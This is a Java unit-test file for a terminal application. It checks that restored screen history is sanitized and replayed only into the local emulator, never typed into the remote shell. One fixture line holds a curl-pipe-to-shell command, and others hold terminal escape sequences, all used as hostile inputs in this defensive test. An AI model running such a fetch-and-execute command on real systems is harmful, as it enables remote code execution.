package de.kortty.ui;

import com.sithtermfx.core.CursorShape;
import com.sithtermfx.core.TerminalDisplay;
import com.sithtermfx.core.TextStyle;
import com.sithtermfx.core.emulator.mouse.MouseFormat;
import com.sithtermfx.core.emulator.mouse.MouseMode;
import com.sithtermfx.core.model.SithTerminal;
import com.sithtermfx.core.model.StyleState;
import com.sithtermfx.core.model.TerminalSelection;
import com.sithtermfx.core.model.TerminalTextBuffer;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;
import org.testng.annotations.Test;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;

import static com.google.common.truth.Truth.assertThat;
import static org.testng.Assert.assertThrows;

/**
 * A project's saved screen is old output. It used to be typed into the remote shell as a heredoc,
 * which expanded or ran whatever shell syntax that output contained. These cases pin that it is
 * now only ever written into the local emulator: verbatim, dimmed, unable to carry escape
 * sequences, and without leaking its style into the live session.
 */
class RestoredHistoryReplayTest {

    private static final String ESC = "\u001B";

    // --- sanitize -----------------------------------------------------------------------------

    @Test
    void sanitizeStripsTheRowPaddingOfTheSavedScreen() {
        assertThat(RestoredHistoryReplay.sanitize("prompt$ ls      \nfile.txt        \n"))
            .containsExactly("prompt$ ls", "file.txt").inOrder();
    }

    @Test
    void sanitizeRemovesEscBelC1AndDel() {
        String raw = "a" + ESC + "[31mred" + ESC + "[0m\u0007b\u009Bc\u007Fd\u0000e\u0090f";

        assertThat(RestoredHistoryReplay.sanitize(raw)).containsExactly("a[31mred[0mbcdef");
    }

    @Test
    void sanitizeExpandsTabsOnEightColumnStops() {
        assertThat(RestoredHistoryReplay.sanitize("a\tb\nabcdefgh\tx\n\tlead"))
            .containsExactly("a       b", "abcdefgh        x", "        lead").inOrder();
    }

    @Test
    void sanitizeNormalizesEveryLineBreakStyle() {
        assertThat(RestoredHistoryReplay.sanitize("one\r\ntwo\rthree\nfour"))
            .containsExactly("one", "two", "three", "four").inOrder();
    }

    @Test
    void sanitizeCollapsesBlankRunsAndTrimsBlankEdges() {
        String raw = "\n   \n\nfirst\n\n\n   \n\nsecond\n\nthird\n     \n\n";

        assertThat(RestoredHistoryReplay.sanitize(raw))
            .containsExactly("first", "", "second", "", "third").inOrder();
    }

    @Test
    void sanitizeKeepsOnlyTheNewestRows() {
        StringBuilder raw = new StringBuilder();
        int total = RestoredHistoryReplay.MAX_LINES + 25;
        for (int i = 0; i < total; i++) {
            raw.append("line ").append(i).append('\n');
        }

        List<String> lines = RestoredHistoryReplay.sanitize(raw.toString());

        assertThat(lines).hasSize(RestoredHistoryReplay.MAX_LINES);
        assertThat(lines.get(0)).isEqualTo("line 25");
        assertThat(lines.get(lines.size() - 1)).isEqualTo("line " + (total - 1));
    }

    @Test
    void sanitizeReturnsNothingWhenNothingPrintableIsLeft() {
        assertThat(RestoredHistoryReplay.sanitize(null)).isEmpty();
        assertThat(RestoredHistoryReplay.sanitize("")).isEmpty();
        assertThat(RestoredHistoryReplay.sanitize("   \n   \n")).isEmpty();
        assertThat(RestoredHistoryReplay.sanitize(ESC + "\u0007\u009B\r\n")).isEmpty();
    }

    @Test
    void sanitizeDropsTheDoubleWidthPlaceholderTheEmulatorAddsBackOnWrite() {
        assertThat(RestoredHistoryReplay.sanitize("日本 ok"))
            .containsExactly("日本 ok");
    }

    // --- replay -------------------------------------------------------------------------------

    @Test
    void replayWritesShellSyntaxVerbatimIntoTheLocalScreen() {
        Session session = new Session(40, 10);
        List<String> lines = List.of("echo $(curl -s http://x | sh)", "`make install`", "$HOME", "H");

        RestoredHistoryReplay.replay(session.terminal, lines, "Restored output from today", "End of restored output");

        assertThat(session.rows().subList(0, 6)).containsExactly(
            "── Restored output from today ──",
            "echo $(curl -s http://x | sh)",
            "`make install`",
            "$HOME",
            "H",
            "── End of restored output ──").inOrder();
    }

    @Test
    void replayDimsTheRestoredRowsAndMarksTheFrameItalic() {
        Session session = new Session(40, 10);

        RestoredHistoryReplay.replay(session.terminal, List.of("old output"), "header", "footer");

        TextStyle header = session.buffer.getLine(0).getStyleAt(0);
        TextStyle body = session.buffer.getLine(1).getStyleAt(0);
        TextStyle footer = session.buffer.getLine(2).getStyleAt(0);
        assertThat(header.hasOption(TextStyle.Option.DIM)).isTrue();
        assertThat(header.hasOption(TextStyle.Option.ITALIC)).isTrue();
        assertThat(body.hasOption(TextStyle.Option.DIM)).isTrue();
        assertThat(body.hasOption(TextStyle.Option.ITALIC)).isFalse();
        assertThat(footer.hasOption(TextStyle.Option.DIM)).isTrue();
        assertThat(footer.hasOption(TextStyle.Option.ITALIC)).isTrue();
    }

    @Test
    void replayRestoresTheStyleThatWasCurrentBefore() {
        Session session = new Session(40, 10);
        TextStyle bold = new TextStyle.Builder().setOption(TextStyle.Option.BOLD, true).build();
        session.terminal.characterAttributes(bold);

        RestoredHistoryReplay.replay(session.terminal, List.of("old output"), "header", "footer");
        session.terminal.writeUnwrappedString("live");

        assertThat(session.styleState.getCurrent()).isEqualTo(bold);
        TextStyle live = session.buffer.getLine(3).getStyleAt(0);
        assertThat(live.hasOption(TextStyle.Option.DIM)).isFalse();
        assertThat(live.hasOption(TextStyle.Option.BOLD)).isTrue();
        // The restored rows inherit the colours/attributes in effect and only add DIM.
        assertThat(session.buffer.getLine(1).getStyleAt(0).hasOption(TextStyle.Option.BOLD)).isTrue();
    }

    @Test
    void replayRestoresTheStyleEvenWhenAWriteFails() {
        StyleState styleState = new StyleState();
        TerminalTextBuffer buffer = new TerminalTextBuffer(40, 10, styleState);
        TextStyle before = styleState.getCurrent();
        SithTerminal failing = new SithTerminal(new NoopDisplay(), buffer, styleState) {
            private int writes;

            @Override
            public void writeUnwrappedString(String string) {
                if (++writes == 2) {
                    throw new IllegalStateException("simulated write failure");
                }
                super.writeUnwrappedString(string);
            }
        };

        assertThrows(IllegalStateException.class,
            () -> RestoredHistoryReplay.replay(failing, List.of("first", "second"), "header", "footer"));

        assertThat(styleState.getCurrent()).isEqualTo(before);
        assertThat(styleState.getCurrent().hasOption(TextStyle.Option.DIM)).isFalse();
    }

    @Test
    void anEmbeddedClearScreenSequenceDoesNotClearEarlierRows() {
        Session session = new Session(40, 10);
        session.terminal.writeUnwrappedString("Connecting...");
        session.terminal.carriageReturn();
        session.terminal.newLine();

        RestoredHistoryReplay.replay(session.terminal,
            RestoredHistoryReplay.sanitize(ESC + "[2J" + ESC + "[Hboom" + ESC + "c"), "header", "footer");

        assertThat(session.rows().subList(0, 4)).containsExactly(
            "Connecting...", "── header ──", "[2J[Hboomc", "── footer ──").inOrder();
    }

    @Test
    void replayStartsOnAFreshRowAfterAPartialLine() {
        Session session = new Session(40, 10);
        session.terminal.writeUnwrappedString("half a line");

        RestoredHistoryReplay.replay(session.terminal, List.of("old"), "header", "footer");

        assertThat(session.rows().subList(0, 4))
            .containsExactly("half a line", "── header ──", "old", "── footer ──").inOrder();
    }

    @Test
    void aRowThatFillsTheWidthIsNotFollowedByABlankRow() {
        Session session = new Session(10, 8);

        RestoredHistoryReplay.replay(session.terminal, List.of("0123456789", "rest", "", "next"), null, null);

        assertThat(session.rows().subList(0, 5))
            .containsExactly("0123456789", "rest", "", "next", "").inOrder();
    }

    @Test
    void replayWritesNothingForAnEmptyBlock() {
        Session session = new Session(20, 4);

        RestoredHistoryReplay.replay(session.terminal, List.of(), "header", "footer");

        assertThat(session.rows()).containsExactly("", "", "", "").inOrder();
        assertThat(session.terminal.getCursorY()).isEqualTo(1);
    }

    @Test
    void replayScrollsLongBlocksIntoTheHistoryBuffer() {
        Session session = new Session(20, 4);
        List<String> lines = new ArrayList<>();
        for (int i = 0; i < 10; i++) {
            lines.add("row " + i);
        }

        RestoredHistoryReplay.replay(session.terminal, lines, "header", "footer");

        // 12 rows written plus the empty cursor row: 9 scrolled out of a 4-row screen.
        assertThat(session.buffer.getHistoryLinesCount()).isEqualTo(9);
        assertThat(session.rows().subList(0, 3)).containsExactly("row 8", "row 9", "── footer ──").inOrder();
    }

    @Test
    void formatSavedAtUsesTheShortLocalizedForm() {
        LocalDateTime savedAt = LocalDateTime.of(2026, 10, 2, 14, 30);

        String german = RestoredHistoryReplay.formatSavedAt(savedAt, Locale.GERMANY);

        assertThat(german).contains("02.10.26");
        assertThat(german).contains("14:30");
        assertThat(RestoredHistoryReplay.formatSavedAt(savedAt, null)).isNotEmpty();
    }

    /** Headless emulator, built like {@code SithTerminalScrollRegionPatchTest.Session}. */
    private static final class Session {

        private final StyleState styleState = new StyleState();

        private final TerminalTextBuffer buffer;

        private final SithTerminal terminal;

        Session(int columns, int rows) {
            buffer = new TerminalTextBuffer(columns, rows, styleState);
            terminal = new SithTerminal(new NoopDisplay(), buffer, styleState);
        }

        List<String> rows() {
            return Arrays.stream(buffer.getScreenLines().split("\n", -1))
                .limit(buffer.getHeight())
                .map(String::stripTrailing)
                .toList();
        }
    }

    /** Minimal display: SithTermFX's own test doubles are not published in the artifact. */
    private static final class NoopDisplay implements TerminalDisplay {

        @Override
        public void setCursor(int x, int y) {
        }

        @Override
        public void setCursorShape(@Nullable CursorShape cursorShape) {
        }

        @Override
        public void beep() {
        }

        @Override
        public void scrollArea(int scrollRegionTop, int scrollRegionSize, int dy) {
        }

        @Override
        public void setCursorVisible(boolean isCursorVisible) {
        }

        @Override
        public void useAlternateScreenBuffer(boolean useAlternateScreenBuffer) {
        }

        @Override
        public String getWindowTitle() {
            return "";
        }

        @Override
        public void setWindowTitle(@NotNull String windowTitle) {
        }

        @Override
        public @Nullable TerminalSelection getSelection() {
            return null;
        }

        @Override
        public void terminalMouseModeSet(@NotNull MouseMode mouseMode) {
        }

        @Override
        public void setMouseFormat(@NotNull MouseFormat mouseFormat) {
        }

        @Override
        public boolean ambiguousCharsAreDoubleWidth() {
            return false;
        }
    }
}
